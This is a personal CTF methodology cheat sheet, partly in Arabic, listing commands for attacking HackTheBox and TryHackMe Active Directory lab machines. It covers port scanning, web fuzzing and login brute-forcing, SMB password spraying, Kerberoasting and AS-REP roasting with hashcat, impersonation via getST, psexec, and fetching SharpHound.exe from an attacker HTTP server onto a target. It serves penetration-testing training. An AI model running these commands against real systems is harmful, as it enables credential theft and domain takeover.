# CTF Methodology

### nmap 
```bash


1-
nmap -p- --min-rate 10000 + ip

nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,62656 -sCV + ip
------- -------- --------- --------- ------ ------- ------ ------- --------- ------
2-
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp + IP

nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts + IP

nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp + IP



------- -------- --------- --------- ------ ------- ------ ------- --------- ------

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

------- -------- --------- --------- ------ ------- ------ ------- --------- ------
sudo apt install seclists
------- -------- --------- --------- ------ ------- ------ ------- --------- ------
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe 

mv kerbrute_linux_amd64 kerbrute

chmod +x kerbrute


#identify all devices on the

nmap -sn 192.168.224.0/24

------- -------- --------- --------- ------ ------- ------ ------- --------- ------
nmap -v -sC -sV
nmap -T4 -sV -A
nmap -p- -A -nP

------- -------- --------- --------- ------ ------- ------ ------- --------- ------
the best to CTF
sudo nmap -A -p- -T4 -sV -Pn + IP
sudo nmap -A -p- -T4 -sC -Pn + IP
sudo nmap -A -T4 -sC -Pn + IP


```
### etc/hosts
```
I’ll add a line to my local `/etc/hosts` file:

10.10.11.152 timelapse.htb dc01.timelapse.htb

```



# http
### dirctory 
```
1- Basic Usage
	dirb http://example.com

2- Using a Custom Wordlist
	dirb http://example.com /usr/share/seclists/Discovery/Web-Content/common.txt

3- Ignoring Extensions
	dirb http://example.com -X .php,.html

4- Using a Proxy
	dirb http://example.com -p 127.0.0.1:8080

5- Output Results to a File
	dirb http://example.com -o output.txt

6- Recursive Scanning
	dirb http://example.com -r

7- Scanning with User-Agent Spoofing
	dirb http://example.com -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

8- Full Command
	dirb http://example.com /usr/share/dirb/wordlists/big.txt -o results.txt -p
	 127.0.0.1:8080 -A "Mozilla/5.0"
---------------------------------------------------------------------------------
9-Basic Usage

gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

10- Scanning with PHP and TXT file extensions
gobuster dir -u http://example.com -w wordlist.txt -x php,txt

11- Basic Usage
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

12- Fuzzing parameters
ffuf -u "http://example.com/index.php?FUZZ=value" -w wordlist.txt -mc 200


13- Basic Usage
wfuzz -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

14- Fuzzing parameters
wfuzz -u "http://example.com/index.php?FUZZ=value" -w wordlist.txt --hc 404

15- Scan Hidden Files & Directories with Custom Extensions
gobuster dir -u http://example.com -w wordlist.txt -x php,asp,html,txt -t 50

16- VHOST Enumeration (Finding Subdomains)
gobuster vhost -u http://example.com -w subdomains.txt

17- Scan for Open S3 Buckets
gobuster s3 -w wordlist.txt

18- Fuzz Multiple Parts of a URL
ffuf -u http://FUZZ.example.com/DIRECTORY -w subdomains.txt:FUZZ -w directories.txt:DIRECTORY -mc 200

19- Fuzz GET Parameters
ffuf -u "http://example.com/index.php?id=FUZZ" -w params.txt -mc 200

20- Fuzz POST Requests
ffuf -u "http://example.com/login.php" -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -mc 200

21- Hidden API Discovery (Headers + JSON)
ffuf -u "http://example.com/api/FUZZ" -w apis.txt -H "Authorization: Bearer YOUR_TOKEN" -mc 200

22- Fuzz Multiple Parameters in One Request
wfuzz -u "http://example.com/index.php?FUZZ1=value1&FUZZ2=value2" -w wordlist1.txt,wordlist2.txt --hc 404

23- Fuzz Cookies (Bypass Authentication)
wfuzz -u "http://example.com/admin" -b "session=FUZZ" -w wordlist.txt --hc 404

24- Fuzz JSON POST Body
wfuzz -u "http://example.com/api" -d '{"user": "admin", "pass": "FUZZ"}' -w passwords.txt --hc 403

25- Advanced Filtering (Custom Status Codes & Length)
wfuzz -u "http://example.com/FUZZ" -w wordlist.txt --hl 10 --hh 100 --hc 404



```
### subdomain
```
wfuzz -u http://object.htb -H 'Host: FUZZ.object.htb'
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 29932



```

# etc/resolv.conf
if port of dns 53
```
nameserver 10.10.10.161    search htb.local forest.htb.local

To make sure
dig @10.10.10.161 htb.local
dig @10.10.10.161 forest.htb.local

```


# SMB (Server Message Block) & netexec
- **SMB** 
  هو بروتوكول يستخدم للمشاركة بين الأجهزة على الشبكة، مثل مشاركة الملفات والطابعات.
- يعمل **SMB** على المنافذ:
    - **TCP 139**: يستخدم مع NetBIOS.
    - **TCP 445**: يستخدم بدون NetBIOS (الإصدار الحديث من SMB).

#### **Enumeration ( SMB)**

تعداد SMB هو عملية جمع المعلومات عن الخدمات والموارد المشتركة على خادم Windows. من خلال ذلك، يمكن استكشاف:

1. **المشاركات المتاحة** (Shares).
2. **الأذونات** (Permissions) لكل مشاركة.
3. **المستخدمين وكلمات المرور** في بعض الحالات.

```
nmap --script smb-enum-shares -p 139,445 [ip]
nmap --script smb-vuln* -p 139,445 [ip]

Check Null Sessions
	1- smbmap -H [ip/hostname]
	2- rpcclient -U "" -N [ip]
	3- smbclient \\\\[ip]\\[share_name]
Overall Scan
	1- enum4linux -a [ip]
	2- ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
Credential Brute Force
	crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success

0- enum4linux -a 10.10.10.100
00- smbmap -H 10.10.10.100

لو مسموح ب 
READ ONLY
لاي واحده من ال 
shares
نعمل
smbclient //10.10.10.100/shares$ -U ""%""
او
smbmap -H 10.10.10.100 -R
عشان نعرض محتوي ال 
shares


1- crackmapexec smb dc01.timelapse.htb => to know SMBv1 true or false

2- crackmapexec smb dc01.timelapse.htb --shares => try show shares if happend 
	error "STATUS_USER_SESSION_DELETED" problem in uthentication


3- smbclient -L //dc01.timelapse.htb -N => to make null uthentication

4- smbclient -N //dc01.timelapse.htb/Shares => to show shares and discaver them

otherwayes

smbclient -L //IP/


smbclient -L IP -U ""

smbclient \\\\IP\\DIRTORY => LIKE SHARE

netexec smb ip -u 'Anonymous' -p '' --rid-brute


##spraying

netexec smb ip -u users.txt -p 'pasword'

dir
recurse on
prompt off
mget *

```

### enum4linux
```
enum4linux -M + ip 
enum4linux -a 10.10.10.100
```

# GPP Passwords
```
Groups.xml => contan hash gpp 
to decrypt it use 
	gpp-decrypt + The hash
```

# file compressed have password
```
1- zip2john winrm_backup.zip > winrm_backup.hash => to get the hash of file and try to broke it by John the Ripper or Hashcat

2- john --wordlist=/path/to/wordlist.txt winrm_backup.hash

3- unzip winrm_backup.zip



```
# openssl => used with extention`.pfx`
may be contain Public Certificate and Private Key
```
1- openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key
to show Private Key

2- openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt
to show Public Certificate

3- openssl rsa -in private.key -out private_unencrypted.key
to unencrypted the private key

```

# **Evil-WinRM**
```
1- sudo gem install evil-winrm

2-
evil-winrm -i [IP_ADDRESS] -S -k private.key -c cert.crt

OR
evil-winrm -i <Target_IP> -u legacyy -k private_unencrypted.key



otherwayes

ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u username -p password



```
# rpcclient

```
1- rpcclient ~~~~~.LOCL -U USER 

2- rpcclient -U "" -N 10.10.10.161 
rpcclient $> enumdomusers 
rpcclient $> enumdomgroups 
rpcclient $> querygroup 0x200
rpcclient $> querydispinfo
```
#  LDAP

```shell
1-
ldapdomaindump -u '~~~~.thm' -p 'password' IP  


2-

ldapsearch -x -h 10.10.10.175 -s base namingcontexts

ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'


```
# kerbrute

```
./kerbrute userenum --dc IP -d lab.enterprise.thm /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -o users.txt

```


# Kerberoasting

#### **الخطوة 1: الحصول على Ticket باستخدام GetUserSPNs.py**

**GetUserSPNs.py** 
هو سكربت ضمن أدوات 
**Impacket**.

- الغرض منه هو البحث عن الحسابات المرتبطة بخدمات محددة (**Service Accounts**) واستخراج Ticket المشفرة.

```
GetUserSPNs.py -request -dc-ip <IP> <Domain>/<User> -save -outputfile <OutputFile>

ServicePrincipalName (SPN)

result may be hash use tool to decrept it like hashcat or john

hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

13100 => $krb5tgs$23$*Administrator$ACTIVE.HTB$act
based on 23


```

# AS-REP Roasting

- الAS-REP Roasting هو نوع من الهجمات على بروتوكول **Kerberos** في بيئات **Active Directory**. هذا الهجوم يستغل الحسابات التي تكون خاصية **"Do not require Kerberos preauthentication"** مفعّلة لديها.
-  الخاصية دي معناها إن الحساب مش بيحتاج يثبت هويته (Pre-Authentication) قبل ما الـ KDC (Key Distribution Center) يرسل له التذكرة (TGT - Ticket Granting Ticket).
- - لما الحساب يكون عنده الخاصية دي، ممكن أي حد يطلب التذكرة (TGT) من KDC حتى بدون كلمة مرور، والتذكرة المرسلة بتكون مشفرة بمفتاح مشتق من كلمة مرور الحساب، وبالتالي يمكن كسرها للحصول على كلمة المرور.
- نستخدم GetNPUsers.py عشان نتأكد ان خاصيه **UF_DONT_REQUIRE_PREAUTH** مفعّلة علي ال list الطلعنها من rpc or smb or kerbrute
- لو مفعله بيرجع لنا التذكرة (TGT) المشفرة.
- لو مش مفعّلة، بيتم إعلامنا بذلك.
```
if have list call users.txt

for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done


or

python3 GetNPUsers.py  remo.htb/ -dc-ip 192.168.1.8 -request -usersfile users.txt  

if ansewr is 
	1- [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set [X]
	2- $krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c...



ف الحاله التانيه نستخدم اده لكسر التشفير مع مرعات ان 

18200 is AS-REP like :
	hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force

```
# GetUserSPNs.py 
```
python3 GetUserSPNs.py -dc-ip IP ~~~~~.LOCL/USER:PASSWORD -request
```
# RDP


```

xfreedp /u:username /p:password /v:~~~.thm /dynamic-resolution

```
# GetNPUsers.py

```
python3 GetNPUsers.py  remo.htb/ -dc-ip 192.168.1.8 -request -usersfile users.txt  
```
# getST.py 

```
└─$ python3 /opt/Tools/impacket/examples/getST.py -spn 'cifs/haystack.thm.corp' -impersonate 'administrator' -altservice 'cifs' -hashes :3A9BB08C656640AC3DBF4F8038755264 'thm.corp/darla_winters'

```

# wmiexec

```
impacket-wmiexec -k 'thm.corp/Administrator'@haystack.thm.corp -no-pass

```
# JOHN


```

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```


### Bloodhound

```bash
1-

cd /path/to/SharpHound/


2-

 - `python3 -m http.server 8000`

3-

- `Invoke-WebRequest -Uri http://<Kali-IP>:8000/SharpHound.exe -OutFile C:\Users\<username>\Documents\SharpHound.exe`



4-


SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs

----------------------------------------------------------------

### copy target x host
- scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .



SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs


```



# server http
```python
python3 -m http.server 8000
```


# if u Administrator want system => PSExec from Impacket
```
psexec.py active.htb/administrator@10.10.10.100
```
